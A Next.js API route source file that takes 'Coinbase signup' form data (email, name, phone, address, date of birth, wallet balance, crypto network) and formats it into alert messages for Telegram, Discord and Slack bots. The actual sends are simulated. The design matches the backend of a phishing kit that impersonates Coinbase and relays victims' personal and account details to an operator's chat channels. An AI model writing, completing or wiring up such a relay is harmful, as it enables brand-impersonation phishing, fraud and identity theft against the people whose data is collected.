import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json()

    // Log the received data (in production, you'd send this to your bot system)
    console.log("New Coinbase signup data received:", {
      timestamp: formData.timestamp,
      email: formData.email,
      fullName: formData.fullName,
      country: formData.country,
      phone: formData.phoneWithCode,
      cryptoNetwork: formData.cryptoNetwork,
      balance: formData.balance,
    })

    // Simulate different bot notification channels
    const botNotifications = [
      {
        botType: "Telegram Bot",
        message: `🚨 NEW COINBASE SIGNUP ALERT 🚨
        
📧 Email: ${formData.email}
👤 Name: ${formData.fullName}
🌍 Country: ${formData.country}
📱 Phone: ${formData.phoneWithCode}
💰 Balance: $${formData.balance || "0"}
🔗 Network: ${formData.cryptoNetwork}
📅 Date: ${new Date(formData.timestamp).toLocaleString()}
🌐 Timezone: ${formData.timezone}`,
      },
      {
        botType: "Discord Bot",
        message: `**New Coinbase Account Registration**
        
**Email:** ${formData.email}
**Full Name:** ${formData.fullName}
**Location:** ${formData.city}, ${formData.state}, ${formData.country}
**Phone:** ${formData.phoneWithCode}
**Address:** ${formData.address}
**DOB:** ${formData.dateOfBirth}
**Balance:** $${formData.balance || "0"}
**Crypto Network:** ${formData.cryptoNetwork}
**User Agent:** ${formData.userAgent}
**Timestamp:** ${formData.timestamp}`,
      },
      {
        botType: "Slack Bot",
        message: `🎯 *Coinbase Signup Alert*
        
• *Email:* ${formData.email}
• *Name:* ${formData.fullName}
• *Country:* ${formData.country} (${formData.countryCode})
• *Phone:* ${formData.phoneWithCode}
• *Balance:* $${formData.balance || "0"}
• *Network:* ${formData.cryptoNetwork}
• *Time:* ${new Date(formData.timestamp).toLocaleString()}`,
      },
    ]

    // In a real implementation, you would send these to actual bot APIs
    // For demonstration, we'll just log them
    botNotifications.forEach((notification) => {
      console.log(`\n=== ${notification.botType} Notification ===`)
      console.log(notification.message)
      console.log("=====================================\n")
    })

    // Simulate API calls to different bot services
    const botResponses = await Promise.all([
      // Telegram Bot API simulation
      simulateBotAPI("telegram", botNotifications[0].message),
      // Discord Webhook simulation
      simulateBotAPI("discord", botNotifications[1].message),
      // Slack Webhook simulation
      simulateBotAPI("slack", botNotifications[2].message),
    ])

    return NextResponse.json({
      success: true,
      message: "Form data successfully sent to all notification bots",
      botResponses: botResponses,
      timestamp: new Date().toISOString(),
    })
  } catch (error) {
    console.error("Error processing bot notifications:", error)
    return NextResponse.json(
      {
        success: false,
        message: "Failed to send notifications to bots",
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

// Simulate bot API calls
async function simulateBotAPI(botType: string, message: string) {
  // Simulate network delay
  await new Promise((resolve) => setTimeout(resolve, Math.random() * 1000 + 500))

  return {
    botType,
    status: "sent",
    timestamp: new Date().toISOString(),
    messageLength: message.length,
  }
}
